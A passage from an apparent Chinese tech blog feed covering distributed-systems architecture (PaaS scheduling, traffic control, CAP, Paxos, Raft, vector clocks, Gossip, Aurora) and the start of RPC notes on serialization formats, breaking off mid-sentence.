title="服务的弹性伸缩和故障迁移"></a>服务的弹性伸缩和故障迁移</h4><p>有了上述的服务状态拟合的基础工作之后，我们就能很容易地管理服务的生命周期了，甚至可以通过底层的支持进行便利的服务弹性伸缩和故障迁移。</p><p>对于弹性伸缩，在上面我已经给出了一个服务伸缩所需要的操作步骤。还是比较复杂的，其中涉及到了：</p><ul><li>底层资源的伸缩；</li><li>服务的自动化部署；</li><li>服务的健康检查；</li><li>服务发现的注册；</li><li>服务流量的调度。</li></ul><p>而对于故障迁移，也就是服务的某个实例出现问题时，我们需要自动地恢复它。对于服务来说，有两种模式，一种是宠物模式，一种是奶牛模式。</p><ul><li>所谓宠物模式，就是一定要救活，主要是对于 stateful 的服务。</li><li>而奶牛模式，就是不用救活了，重新生成一个实例。</li></ul><p>对于这两种模式，在运行中也是比较复杂的，其中涉及到了：</p><ul><li>服务的健康监控（这可能需要一个 APM 的监控）。</li><li>如果是宠物模式，需要：服务的重新启动和服务的监控报警（如果重试恢复不成功，需要人工介入）。</li><li>如果是奶牛模式，需要：服务的资源申请，服务的自动化部署，服务发现的注册，以及服务的流量调度。</li></ul><p>把传统的服务迁移到 Docker 和 Kubernetes 上来，再加上更上层的对服务生命周期的控制系统的调度，我们就可以做到一个完全自动化的运维架构了。</p><h4 id="服务工作流和编排"><a href="#服务工作流和编排" class="headerlink" title="服务工作流和编排"></a>服务工作流和编排</h4><p>正如上面和操作系统做的类比一样，一个好的操作系统需要能够通过一定的机制把一堆独立工作的进程给协同起来。在分布式的服务调度中，这个工作叫做 <strong>Orchestration</strong>，国内把这个词翻译成<strong>“编排”</strong>。</p><h3 id="流量与数据调度"><a href="#流量与数据调度" class="headerlink" title="流量与数据调度"></a>流量与数据调度</h3><p>关于流量调度，现在很多人都把这个事和服务治理混为一谈了。但是还是应该分开的。</p><ol><li>一方面，服务治理是内部系统的事，而流量调度可以是内部的，更是外部接入层的事。</li><li>另一方面，服务治理是数据中心的事，而流量调度要做得好，应该是数据中心之外的事，也就是我们常说的边缘计算，是应该在类似于 CDN 上完成的事。</li></ol><p>所以，流量调度和服务治理是在不同层面上的，不应该混在一起，所以在系统架构上应该把它们分开。</p><h4 id="流量调度的主要功能"><a href="#流量调度的主要功能" class="headerlink" title="流量调度的主要功能"></a>流量调度的主要功能</h4><p>对于一个流量调度系统来说，其应该具有的主要功能是：</p><ol><li>依据系统运行的情况，自动地进行流量调度，在无需人工干预的情况下，提升整个系统的稳定性；</li><li>让系统应对爆品等突发事件时，在弹性计算扩缩容的较长时间窗口内或底层资源消耗殆尽的情况下，保护系统平稳运行。</li></ol><p>这还是为了提高系统架构的稳定性和高可用性。</p><p>此外，这个流量调度系统还可以完成以下几方面的事情。</p><ul><li><strong>服务流控。</strong>服务发现、服务路由、服务降级、服务熔断、服务保护等。</li><li><strong>流量控制。</strong>负载均衡、流量分配、流量控制、异地灾备（多活）等。</li><li><strong>流量管理。</strong>协议转换、请求校验、数据缓存、数据计算等。</li></ul><p>所有的这些都应该是一个 API Gateway 应该做的事。</p><h4 id="流量调度的关键技术"><a href="#流量调度的关键技术" class="headerlink" title="流量调度的关键技术"></a>流量调度的关键技术</h4><p>一个好的 API Gateway 需要具备以下的关键技术。</p><ul><li><strong>高性能。</strong>API Gateway 必须使用高性能的技术，所以，也就需要使用高性能的语言。</li><li><strong>扛流量。</strong>要能扛流量，就需要使用集群技术。集群技术的关键点是在集群内的各个结点中共享数据。这就需要使用像 Paxos、Raft、Gossip 这样的通讯协议。因为 Gateway 需要部署在广域网上，所以还需要集群的分组技术。</li><li><strong>业务逻辑。</strong>API Gateway 需要有简单的业务逻辑，所以，最好是像 AWS 的 Lambda 服务一样，可以让人注入不同语言的简单业务逻辑。</li><li><strong>服务化。</strong>一个好的 API Gateway 需要能够通过 Admin API 来不停机地管理配置变更，而不是通过一个.conf 文件来人肉地修改配置。</li></ul><h4 id="状态数据调度"><a href="#状态数据调度" class="headerlink" title="状态数据调度"></a>状态数据调度</h4><p>对于服务调度来说，最难办的就是有状态的服务了。这里的状态是 State，也就是说，有些服务会保存一些数据，而这些数据是不能丢失的，所以，这些数据是需要随服务一起调度的。</p><p>一般来说，我们会通过“转移问题”的方法来让服务变成“无状态的服务”。也就是说，会把这些有状态的东西存储到第三方服务上，比如 Redis、MySQL、ZooKeeper，或是 NFS、Ceph 的文件系统中。</p><p>这些“转移问题”的方式把问题转移到了第三方服务上，于是自己的 Java 或 PHP 服务中没有状态，但是 Redis 和 MySQL 上则有了状态。所以，我们可以看到，现在的分布式系统架构中出问题的基本都是这些存储状态的服务。</p><p>因为数据存储结点在 Scale 上比较困难，所以成了一个单点的瓶颈。</p><h4 id="分布式事务一致性的问题"><a href="#分布式事务一致性的问题" class="headerlink" title="分布式事务一致性的问题"></a>分布式事务一致性的问题</h4><p>要解决数据结点的 Scale 问题，也就是让数据服务可以像无状态的服务一样在不同的机器上进行调度，这就会涉及数据的 replication 问题。而数据 replication 则会带来数据一致性的问题，进而对性能带来严重的影响。</p><p>要解决数据不丢失的问题，只能通过数据冗余的方法，就算是数据分区，每个区也需要进行数据冗余处理。这就是数据副本。当出现某个节点的数据丢失时，可以从副本读到。数据副本是分布式系统解决数据丢失异常的唯一手段。简单来说：</p><ul><li>要想让数据有高可用性，就得写多份数据。</li><li>写多份会引起数据一致性的问题。</li><li>数据一致性的问题又会引发性能问题</li></ul><p>在解决数据副本间的一致性问题时，可以使用以下这些技术方案。</p><ul><li>Master-Slave 方案。</li><li>Master-Master 方案。</li><li>两阶段和三阶段提交方案。</li><li>Paxos 方案。</li></ul><p><strong>关于分布式的事务处理：</strong><a href="https://coolshell.cn/articles/10910.html">https://coolshell.cn/articles/10910.html</a></p><h4 id="状态数据调总结"><a href="#状态数据调总结" class="headerlink" title="状态数据调总结"></a>状态数据调总结</h4><ul><li>对于应用层上的分布式事务一致性，只有两阶段提交这样的方式。</li><li>而底层存储可以解决这个问题的方式是通过一些像 Paxos、Raft 或是 NWR 这样的算法和模型来解决。</li><li>状态数据调度应该是由分布式存储系统来解决的，这样会更为完美。但是因为数据存储的 Scheme 太多，所以，导致我们有各式各样的分布式存储系统，有文件对象的，有关系型数据库的，有 NoSQL 的，有时序数据的，有搜索数据的，有队列的……</li></ul><p>数据调度应该是在 IaaS 层的数据存储解决的问题，而不是在 PaaS 层或者 SaaS 层来解决的。</p><p>在 IaaS 层上解决这个问题，一般来说有三种方案，</p><p>一种是使用比较廉价的开源产品，如：NFS、Ceph、TiDB、CockroachDB、ElasticSearch、InfluxDB、MySQL Cluster 和 Redis Cluster 之类的；另一种是用云计算厂商的方案。当然，如果不差钱的话，可以使用更为昂贵的商业网络存储方案。</p><h3 id="Pass平台的本质"><a href="#Pass平台的本质" class="headerlink" title="Pass平台的本质"></a>Pass平台的本质</h3><p><img src="https://s2.loli.net/2022/08/28/ABQ1nR9wt5opvFY.png" alt="Pass平台.png"></p><p>下面这三件事是 PaaS 跟传统中间件最大的差别。</p><ul><li><strong>服务化是 PaaS 的本质</strong>。软件模块重用，服务治理，对外提供能力是 PaaS 的本质。</li><li><strong>分布式是 PaaS 的根本特性</strong>。多租户隔离、高可用、服务编排是 PaaS 的基本特性。</li><li><strong>自动化是 PaaS 的灵魂</strong>。自动化部署安装运维，自动化伸缩调度是 PaaS 的关键。</li></ul><h2 id="PaaS-平台的总体架构"><a href="#PaaS-平台的总体架构" class="headerlink" title="PaaS 平台的总体架构"></a>PaaS 平台的总体架构</h2><p><img src="https://s2.loli.net/2022/08/28/rTUA9lfnSFjOtqC.png" alt="架构图.png"></p><p>在 Docker+Kubernetes 层之上，我们看到了两个相关的 PaaS 层。一个是 PaaS 调度层，很多人将其称为 iPaaS；另一个是 PaaS 能力层，通常被称为 aPaaS。没有 PaaS 调度层，PaaS 能力层很难被管理和运维，而没有 PaaS 能力层，PaaS 就失去了提供实际能力的业务价值。而本文更多的是在讲 PaaS 调度层上的东西。</p><p>一个完整的 PaaS 平台会包括以下几部分。</p><ul><li>PaaS 调度层 – 主要是 PaaS 的自动化和分布式对于高可用高性能的管理。</li><li>PaaS 能力服务层 – 主要是 PaaS 真正提供给用户的服务和能力。</li><li>PaaS 的流量调度 – 主要是与流量调度相关的东西，包括对高并发的管理。</li><li>PaaS 的运营管理 – 软件资源库、软件接入、认证和开放平台门户。</li><li>PaaS 的运维管理 – 主要是 DevOps 相关的东西。</li></ul><h2 id="PaaS-平台的生产和运维"><a href="#PaaS-平台的生产和运维" class="headerlink" title="PaaS 平台的生产和运维"></a>PaaS 平台的生产和运维</h2><p><img src="https://s2.loli.net/2022/08/28/m2DzoMRpQkUT5Ii.png" alt="image-20220814122700725.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>传统的单体架构系统容量显然是有上限的。同时，为了应对有计划和无计划的下线时间，系统的可用性也是有其极限的。分布式系统为以上两个问题提供了解决方案，并且还附带有其他优势。但是，要同时解决这两个问题决非易事。为了构建分布式系统，我们面临的主要问题如下。</p><ul><li>分布式系统的硬件故障发生率更高，故障发生是常态，需要尽可能地将运维流程自动化。</li><li>需要良好地设计服务，避免某服务的单点故障对依赖它的其他服务造成大面积影响。</li><li>为了容量的可伸缩性，服务的拆分、自治和无状态变得更加重要，可能需要对老的软件逻辑做大的修改。</li><li>老的服务可能是异构的，此时需要让它们使用标准的协议，以便可以被调度、编排，且互相之间可以通信。</li><li>服务软件故障的处理也变得复杂，需要优化的流程，以加快故障的恢复。</li><li>为了管理各个服务的容量，让分布式系统发挥出最佳性能，需要有流量调度技术。</li><li>分布式存储会让事务处理变得复杂；在事务遇到故障无法被自动恢复的情况下，手动恢复流程也会变得复杂。</li><li>测试和查错的复杂度增大。</li><li>系统的吞吐量会变大，但响应时间会变长。</li></ul><p>为了解决这些问题，我们深入了解了以下这些解决方案。</p><ul><li>需要有完善的监控系统，以便对服务运行状态有全面的了解。</li><li>设计服务时要分析其依赖链；当非关键服务故障时，其他服务要自动降级功能，避免调用该服务。</li><li>重构老的软件，使其能被服务化；可以参考 SOA 和微服务的设计方式，目标是微服务化；使用 Docker 和 Kubernetes 来调度服务。</li><li>为老的服务编写接口逻辑来使用标准协议，或在必要时重构老的服务以使得它们有这些功能。</li><li>自动构建服务的依赖地图，并引入好的处理流程，让团队能以最快速度定位和恢复故障。</li><li>使用一个 API Gateway，它具备服务流向控制、流量控制和管理的功能。</li><li>事务处理建议在存储层实现；根据业务需求，或者降级使用更简单、吞吐量更大的最终一致性方案，或者通过二阶段提交、Paxos、Raft、NWR 等方案之一，使用吞吐量小的强一致性方案。</li><li>通过更真实地模拟生产环境，乃至在生产环境中做灰度发布，从而增加测试强度；同时做充分的单元测试和集成测试以发现和消除缺陷；最后，在服务故障发生时，相关的多个团队同时上线自查服务状态，以最快地定位故障原因。</li><li>通过异步调用来减少对短响应时间的依赖；对关键服务提供专属硬件资源，并优化软件逻辑以缩短响应时间。</li></ul><h3 id="基础理论"><a href="#基础理论" class="headerlink" title="基础理论"></a>基础理论</h3><h2 id="CAP-定理"><a href="#CAP-定理" class="headerlink" title="CAP 定理"></a><a href="https://en.wikipedia.org/wiki/CAP_theorem">CAP 定理</a></h2><p>CAP 定理是分布式系统设计中最基础，也是最为关键的理论。它指出，分布式数据存储不可能同时满足以下三个条件。</p><ul><li><strong>一致性（Consistency）</strong>：每次读取要么获得最近写入的数据，要么获得一个错误。</li><li><strong>可用性（Availability）</strong>：每次请求都能获得一个（非错误）响应，但不保证返回的是最新写入的数据。</li><li><strong>分区容忍（Partition tolerance）</strong>：尽管任意数量的消息被节点间的网络丢失（或延迟），系统仍继续运行。</li></ul><p>也就是说，CAP 定理表明，在存在网络分区的情况下，一致性和可用性必须二选一。而在没有发生网络故障时，即分布式系统正常运行时，一致性和可用性是可以同时被满足的。这里需要注意的是，CAP 定理中的一致性与 ACID 数据库事务中的一致性截然不同。</p><p>掌握 CAP 定理，尤其是能够正确理解 C、A、P 的含义，对于系统架构来说非常重要。因为对于分布式系统来说，网络故障在所难免，如何在出现网络故障的时候，维持系统按照正常的行为逻辑运行就显得尤为重要。你可以结合实际的业务场景和具体需求，来进行权衡。</p><p>例如，对于大多数互联网应用来说（如门户网站），因为机器数量庞大，部署节点分散，网络故障是常态，可用性是必须要保证的，所以只有舍弃一致性来保证服务的 AP。而对于银行等，需要确保一致性的场景，通常会权衡 CA 和 CP 模型，CA 模型网络故障时完全不可用，CP 模型具备部分可用性。</p><p><img src="https://s2.loli.net/2022/08/28/VhY8TjpDHOAs6JX.png" alt="image-20220814124520469.png"></p><ul><li>CA (consistency + availability)，这样的系统关注一致性和可用性，它需要非常严格的全体一致的协议，比如“两阶段提交”（2PC）。CA 系统不能容忍网络错误或节点错误，一旦出现这样的问题，整个系统就会拒绝写请求，因为它并不知道对面的那个结点是否挂掉了，还是只是网络问题。唯一安全的做法就是把自己变成只读的。</li><li>CP (consistency + partition tolerance)，这样的系统关注一致性和分区容忍性。它关注的是系统里大多数人的一致性协议，比如：Paxos 算法（Quorum 类的算法）。这样的系统只需要保证大多数结点数据一致，而少数的结点会在没有同步到最新版本的数据时变成不可用的状态。这样能够提供一部分的可用性。</li><li>AP (availability + partition tolerance)，这样的系统关心可用性和分区容忍性。因此，这样的系统不能达成一致性，需要给出数据冲突，给出数据冲突就需要维护数据版本。Dynamo 就是这样的系统。</li></ul><h4 id="Paxos-算法"><a href="#Paxos-算法" class="headerlink" title="Paxos 算法"></a>Paxos 算法</h4><p>Paxos 算法，是莱斯利·兰伯特（Lesile Lamport）于 1990 年提出来的一种基于消息传递且具有高度容错特性的一致性算法。但是这个算法太过于晦涩，所以，一直以来都属于理论上的论文性质的东西。</p><h4 id="Raft-算法"><a href="#Raft-算法" class="headerlink" title="Raft 算法"></a>Raft 算法</h4><p>因为 Paxos 算法太过于晦涩，而且在实际的实现上有太多的坑，并不太容易写对。所以，有人搞出了另外一个一致性的算法，叫 Raft。其原始论文是<a href="https://raft.github.io/raft.pdf"> In search of an Understandable Consensus Algorithm (Extended Version) </a>寻找一种易于理解的 Raft 算法。这篇论文的译文在 InfoQ 上《<a href="http://www.infoq.com/cn/articles/raft-paper">Raft 一致性算法论文译文</a>》</p><p>Raft 算法和 Paxos 的性能和功能是一样的，但是它和 Paxos 算法的结构不一样，这使 Raft 算法更容易理解并且更容易实现。那么 Raft 是怎样做到的呢？</p><p>Raft 把这个一致性的算法分解成了几个部分，一个是领导选举（Leader Selection），一个是日志复制（Log Replication），一个是安全性（Safety），还有一个是成员变化（Membership Changes）。对于一般人来说，Raft 协议比 Paxos 的学习曲线更低，也更平滑。</p><p>Raft 协议中有一个状态机，每个结点会有三个状态，分别是 Leader、Candidate 和 Follower。Follower 只响应其他服务器的请求，如果没有收到任何信息，它就会成为一个 Candidate，并开始进行选举。收到大多数人同意选票的人会成为新的 Leader。</p><p><img src="https://s2.loli.net/2022/08/28/AZdFOXp17fvj2J9.png" alt="image-20220814125128384.png"></p><p>一旦选举出了一个 Leader，它就开始负责服务客户端的请求。每个客户端的请求都包含一个要被复制状态机执行的指令。Leader 首先要把这个指令追加到 log 中形成一个新的 entry，然后通过 AppendEntries RPC 并行地把该 entry 发给其他服务器（server）。如果其他服务器没发现问题，复制成功后会给 Leader 一个表示成功的 ACK。</p><p>Leader 收到大多数 ACK 后应用该日志，返回客户端执行结果。如果 Follower 崩溃 （crash）或者丢包，Leader 会不断重试 AppendEntries RPC。</p><p><img src="https://s2.loli.net/2022/08/28/9EcGBU8KDSrdah5.png" alt="image-20220814125218440.png"></p><p>几个不错的 Raft 算法的动画演示。</p><ul><li><a href="http://thesecretlivesofdata.com/raft/">Raft – The Secret Lives of Data</a></li><li><a href="https://raft.github.io/">Raft Consensus Algorithm</a></li><li><a href="http://kanaka.github.io/raft.js/">Raft Distributed Consensus Algorithm Visualization</a></li></ul><h4 id="逻辑钟和向量钟"><a href="#逻辑钟和向量钟" class="headerlink" title="逻辑钟和向量钟"></a>逻辑钟和向量钟</h4><p>后面，业内又搞出来一些工程上的东西，比如 Amazon 的 DynamoDB，其论文<a href="http://bnrg.eecs.berkeley.edu/~randy/Courses/CS294.F07/Dynamo.pdf">Dynamo: Amazon’s Highly Available Key Value Store</a> 的影响力也很大。这篇论文中讲述了 Amazon 的 DynamoDB 是如何满足系统的高可用、高扩展和高可靠要求的，其中还展示了系统架构是如何做到数据分布以及数据一致性的。</p><p>GFS 采用的是查表式的数据分布，而 DynamoDB 采用的是计算式的，也是一个改进版的通过虚拟结点减少增加结点带来数据迁移的一致性哈希。另外，这篇论文中还讲述了一个 NRW 模式用于让用户可以灵活地在 CAP 系统中选取其中两项，这使用到了 Vector Clock——向量时钟来检测相应的数据冲突。最后还介绍了使用 Handoff 的机制对可用性的提升。</p><p>这篇文章中有几个关键的概念，一个是 Vector Clock，另一个是 Gossip 协议。</p><p>提到向量时钟就需要提一下逻辑时钟。所谓逻辑时间，也就是在分布系统中为了解决消息有序的问题，由于在不同的机器上有不同的本地时间，这些本地时间的同步很难搞，会导致消息乱序。</p><p>于是 Paxos 算法的发明人兰伯特（Lamport）搞了个向量时钟，每个系统维护一个本地的计数器，这就是所谓的逻辑时钟。每执行一个事件（例如向网络发送消息，或是交付到应用层）都对这个计数器做加 1 操作。当跨系统的时候，在消息体上附着本地计算器，当接收端收到消息时，更新自己的计数器（取对端传来的计数器和自己当成计数器的最大值），也就是调整自己的时钟。</p><p>逻辑时钟可以保证，如果事件 A 先于事件 B，那么事件 A 的时钟一定小于事件 B 的时钟，但是返过来则无法保证，因为返过来没有因果关系。所以，向量时钟解释了因果关系。向量时钟维护了数据更新的一组版本号（版本号其实就是使用逻辑时钟）。</p><p>假如一个数据需要存在三个结点上 A、B、C。那么向量维度就是 3，在初始化的时候，所有结点对于这个数据的向量版本是 [A:0, B:0, C:0]。当有数据更新时，比如从 A 结点更新，那么，数据的向量版本变成 [A:1, B:0, C:0]，然后向其他结点复制这个版本，其在语义上表示为我当前的数据是由 A 结果更新的，而在逻辑上则可以让分布式系统中的数据更新的顺序找到相关的因果关系。</p><p>这其中的逻辑关系，你可以看一下<a href="http://lass.cs.umass.edu/~shenoy/courses/spring05/lectures.html"> 马萨诸塞大学课程 Distributed Operating System </a>中第 10 节<a href="http://lass.cs.umass.edu/~shenoy/courses/spring05/lectures/Lec10.pdf"> Clock Synchronization </a>这篇讲议。关于 Vector Clock，你可以看一下<a href="http://basho.com/posts/technical/why-vector-clocks-are-easy/"> Why Vector Clocks are Easy</a>和<a href="http://basho.com/posts/technical/why-vector-clocks-are-hard/">Why Vector Clocks are Hard</a> 这两篇文章。</p><h4 id="Gossip-协议"><a href="#Gossip-协议" class="headerlink" title="Gossip 协议"></a>Gossip 协议</h4><p>另外，DynamoDB 中使用到了 Gossip 协议来做数据同步，这个协议的原始论文是 <a href="https://www.cs.cornell.edu/home/rvr/papers/flowgossip.pdf">Efficient Reconciliation and Flow Control for Anti-Entropy Protocols</a>。Gossip 算法也是 Cassandra 使用的数据复制协议。这个协议就像八卦和谣言传播一样，可以 “一传十、十传百”传播开来。但是这个协议看似简单，细节上却非常麻烦。</p><p>根据这篇论文，节点之间存在三种通信方式。</p><ul><li>push 方式。A 节点将数据 (key,value,version) 及对应的版本号推送给 B 节点，B 节点更新 A 中比自己新的数据。</li><li>pull 方式。A 仅将数据 key,version 推送给 B，B 将本地比 A 新的数据 (key,value,version) 推送给 A，A 更新本地。</li><li>push&#x2F;pull 方式。与 pull 类似，只是多了一步，A 再将本地比 B 新的数据推送给 B，B 更新本地。</li></ul><p>如果把两个节点数据同步一次定义为一个周期，那么在一个周期内，push 需通信 1 次，pull 需 2 次，push&#x2F;pull 则需 3 次。从效果上来讲，push&#x2F;pull 最好，理论上一个周期内可以使两个节点完全一致。直观感觉上，也是 push&#x2F;pull 的收敛速度最快。</p><p>另外，每个节点上的又需要一个协调机制，也就是如何交换数据能达到最快的一致性——消除节点的不一致性。上面所讲的 push、pull 等是通信方式，协调是在通信方式下的数据交换机制。</p><p>关于 Gossip 的一些图示化的东西，可以看一下动画<a href="https://rrmoelker.github.io/gossip-visualization/">gossip visualization</a>。</p><h4 id="分布式数据库方面"><a href="#分布式数据库方面" class="headerlink" title="分布式数据库方面"></a>分布式数据库方面</h4><p>数据库方面的一些论文。</p><p>一篇是 AWS Aurora 的论文 <a href="http://www.allthingsdistributed.com/files/p1041-verbitski.pdf">Amazon Aurora: Design Considerations for High Throughput Cloud –Native Relation Databases</a>。</p><p>Aurora 是 AWS 将 MySQL 的计算和存储分离后，计算节点 scale up，存储节点 scale out。并把其 redo log 独立设计成一个存储服务，把分布式的数据方面的东西全部甩给了底层存储系统。从而提高了整体的吞吐量和水平的扩展能力。</p><p>Aurora 要写 6 份拷贝，但是其只需要把一个 Quorum 中的日志写成功就可以了。如下所示。可以看到，将存储服务做成一个跨数据中心的服务，提高数据库容灾，降低性能影响。</p><p><img src="https://s2.loli.net/2022/08/28/G2eINobOhBxMFXu.png" alt="image-20220814125522918.png"></p><p>对于存储服务的设计，核心的原理就是 latency 一定要低，毕竟写 6 个 copy 是一件开销很大的事。所以，基本上来说，Aurora 用的是异步模型，然后拼命地做并行处理，其中用到的也是 Gossip 协议。如下所示。</p><p><img src="https://s2.loli.net/2022/08/28/8jlGWnqfyZHVTFx.png" alt="image-20220814125553446.png"></p><p>在上面这个图中，我们可以看到，完成前两步，就可以 ACK 回调用方。也就是说，只要数据在本地落地了，就可以返回成功了。然后，对于六个副本，这个 log 会同时发送到 6 个存储结点，只需要有大于 4 个成功 ACK，就算写成功了。第 4 步我们可以看到用的是 Gossip 协议。然后，第 5 步产生 cache 页，便于查询。第 6 步在 S3 做 Snapshot，类似于 Checkpoint。</p><h3 id="经典资料"><a href="#经典资料" class="headerlink" title="经典资料"></a>经典资料</h3><ul><li>Distributed systems theory for the distributed systems engineer</li><li>FLP Impossibility Result</li><li>An introduction to distributed systems</li><li>Distributed Systems for fun and profit</li><li>Distributed Systems: Principles and Paradigms</li><li>Scalable Web Architecture and Distributed Systems</li><li>Principles of Distributed Systems</li><li>Making reliable distributed systems in the presence of software errors</li><li>Designing Data Intensive Applications</li></ul>]]></content>
    
    
    <categories>
      
      <category>分布式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>分布式</tag>
      
      <tag>左耳听风</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RPC实战笔记</title>
    <link href="/2022/08/28/RPC%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/08/28/RPC%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer">#                           RPC总结<h2 id="RPC-的作用"><a href="#RPC-的作用" class="headerlink" title="RPC 的作用"></a>RPC 的作用</h2><ol><li><p>屏蔽远程调用跟本地调用的区别，让我们感觉就是调用项目内的方法；</p></li><li><p>隐藏底层网络通信的复杂性，让我们更专注于业务逻辑。</p></li></ol><h2 id="一个完整的-RPC-会涉及到哪些步骤？"><a href="#一个完整的-RPC-会涉及到哪些步骤？" class="headerlink" title="一个完整的 RPC 会涉及到哪些步骤？"></a>一个完整的 RPC 会涉及到哪些步骤？</h2><p><img src="https://static001.geekbang.org/resource/image/ac/fa/acf53138659f4982bbef02acdd30f1fa.jpg?wh=3846*1377" alt="img"></p><h2 id="RPC架构"><a href="#RPC架构" class="headerlink" title="RPC架构"></a>RPC架构</h2><p><img src="https://static001.geekbang.org/resource/image/30/fb/30f52b433aa5f103114a8420c6f829fb.jpg?wh=2951*2181" alt="img"></p><p>​                                                                                                                      <strong>核心功能体系</strong> </p><p><img src="https://static001.geekbang.org/resource/image/a3/a6/a3688580dccd3053fac8c0178cef4ba6.jpg?wh=3084*2183" alt="img"></p><p>​                                                                                                                  <strong>插件化体系架构</strong> </p><p><strong>插件化体系</strong>整个架构就变成了一个微内核架构，我们将每个功能点抽象成一个接口，将这个接口作为插件的契约，然后把这个功能的接口与功能的实现分离并提供接口的默认实现。这样的架构相比之前的架构，有很多优势。首先它的可扩展性很好，实现了开闭原则，用户可以非常方便地通过插件扩展实现自己的功能，而且不需要修改核心功能的本身；其次就是保持了核心包的精简，依赖外部包少，这样可以有效减少开发人员引入 RPC 导致的包版本冲突问题。</p><h2 id="RPC应用场景"><a href="#RPC应用场景" class="headerlink" title="RPC应用场景"></a>RPC应用场景</h2><p><img src="https://static001.geekbang.org/resource/image/50/be/506e902e06e91663334672c29bfbc2be.jpg?wh=3205*1778" alt="img"></p><h2 id="RPC注意点"><a href="#RPC注意点" class="headerlink" title="RPC注意点"></a>RPC注意点</h2><p><img src="https://s2.loli.net/2022/08/28/c19JKY4lWEjf3y7.png" alt="image-20220716134042279.png"></p><h2 id="RPC协议与HTTP的设计区别"><a href="#RPC协议与HTTP的设计区别" class="headerlink" title="RPC协议与HTTP的设计区别"></a>RPC协议与HTTP的设计区别</h2><p>相对于 HTTP 的用处，RPC 更多的是负责应用间的通信，所以性能要求相对更高。但 HTTP 协议的数据包大小相对请求数据本身要大很多，又需要加入很多无用的内容，比如换行符号、回车符等；还有一个更重要的原因是，HTTP 协议属于无状态协议，客户端无法对请求和响应进行关联，每次请求都需要重新建立连接，响应完成后再关闭连接。因此，对于要求高性能的 RPC 来说，HTTP 协议基本很难满足需求，所以 RPC 会选择设计更紧凑的私有协议。</p><h2 id="对象如何在网络中传输"><a href="#对象如何在网络中传输" class="headerlink" title="对象如何在网络中传输"></a>对象如何在网络中传输</h2><h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p>网络传输的数据必须是二进制数据，但调用方请求的出入参数都是对象。对象是不能直接在网络中传输的，所以我们需要提前把它转成可传输的二进制，并且要求转换算法是可逆的，这个过程叫做“序列化”。这时，服务提供方就可以正确地从二进制数据中分割出不同的请求，同时根据请求类型和序列化类型，把二进制的消息体逆向还原成请求对象，这个过程称之为“反序列化”。</p><p><img src="https://static001.geekbang.org/resource/image/d2/04/d215d279ef8bfbe84286e81174b4e704.jpg" alt="img"></p><h3 id="RPC通信流程"><a href="#RPC通信流程" class="headerlink" title="RPC通信流程"></a>RPC通信流程</h3><p><img src="https://static001.geekbang.org/resource/image/82/59/826a6da653c4093f3dc3f0a833915259.jpg" alt="img"></p><h3 id="常见的序列化方式"><a href="#常见的序列化方式" class="headerlink" title="常见的序列化方式"></a>常见的序列化方式</h3><p><strong>JDK 原生序列化</strong></p><p>JDK序列化过程就是在读取对象数据的时候，不断加入一些特殊分隔符，这些特殊分隔符用于在反序列化过程中截断用。</p><p><img src="https://static001.geekbang.org/resource/image/7e/9f/7e2616937e3bc5323faf3ba4c09d739f.jpg" alt="img"></p><ul><li>头部数据用来声明序列化协议、序列化版本，用于高低版本向后兼容</li><li>对象数据主要包括类名、签名、属性名、属性类型及属性值，当然还有开头结尾等数据，除了属性值属于真正的对象值，其他都是为了反序列化用的元数据</li><li>存在对象引用、继承的情况下，就是递归遍历“写对象”逻辑</li></ul><p><strong>JSON序列化</strong></p><p><strong>缺点：</strong></p><p>JSON 进行序列化的额外空间开销比较大，对于大数据量服务这意味着需要巨大的内存和磁盘开销；JSON 没有类型，但像 Java 这种强类型语言，需要通过反射统一解决，所以性能不会太好。</p><p>JSON 没有类型，但像 Java 这种强类型语言，需要通过反射统一解决，所以性能不会太好。</p><p>所以如果 RPC 框架选用 JSON 序列化，服务提供者与服务调用者之间传输的数据量要相对较小，否则将严重影响性能。</p><p><strong>Hessian序列化</strong></p><p>Hessian 是动态类型、二进制、紧凑的，并且可跨语言移植的一种序列化框架。Hessian 协议要比 JDK、JSON 更加紧凑，性能上要比 JDK、JSON 序列化高效很多，而且生成的字节数也更小。</p><p><strong>Protobuf序列化</strong></p><p>Protobuf 是 Google 公司内部的混合语言数据标准，是一种轻便、高效的结构化数据存储格式，可以用于结构化数据序列化，支持 Java、Python、C++、Go 等语言。Protobuf 使用的时候需要定义 IDL（Interface description language），然后使用不同语言的 IDL 编译器，生成序列化工具类；</p><p><strong>优点：</strong></p><ul><li>序列化后体积相比 JSON、Hessian 小很多；</li><li>IDL 能清晰地描述语义，所以足以帮助并保证应用程序之间的类型不会丢失，无需类似 XML 解析器；</li><li>序列化反序列化速度很快，不需要通过反射获取类型；</li><li>消息格式升级和兼容性不错，可以做到向后兼容。</li></ul><p><strong>缺点：</strong>对于具有反射和动态能力的语言来说，用起来很费劲</p><h4 id="如何选择哪种框架"><a href="#如何选择哪种框架" class="headerlink" title="如何选择哪种框架"></a>如何选择哪种框架</h4><p><img src="https://static001.geekbang.org/resource/image/b4/a5/b42e44968c3fdcdfe2acf96377f5b2a5.jpg" alt="img"></p><h2 id="RPC-框架在使用时要注意哪些问题？"><a href="#RPC-框架在使用时要注意哪些问题？" class="headerlink" title="RPC 框架在使用时要注意哪些问题？"></a>RPC 框架在使用时要注意哪些问题？</h2><p><strong>对象构造得过于复杂：</strong>属性很多，并且存在多层的嵌套，比如 A 对象关联 B 对象，B 对象又聚合 C 对象，C 对象又关联聚合很多其他对象，对象依赖关系过于复杂。序列化框架在序列化与反序列化对象时，对象越复杂就越浪费性能，消耗 CPU，这会严重影响 RPC 框架整体的性能；另外，对象越复杂，在序列化与反序列化的过程中，出现问题的概率就越高。</p><p><strong>对象过于庞大：</strong>我经常遇到业务过来咨询，为啥他们的 RPC 请求经常超时，排查后发现他们的入参对象非常得大，比如为一个大 List 或者大 Map，序列化之后字节长度达到了上兆字节。这种情况同样会严重地浪费了性能、CPU，并且序列化一个如此大的对象是很耗费时间的，这肯定会直接影响到请求的耗时。</p><p><strong>使用序列化框架不支持的类作为入参类：</strong>比如 Hessian 框架，不支持 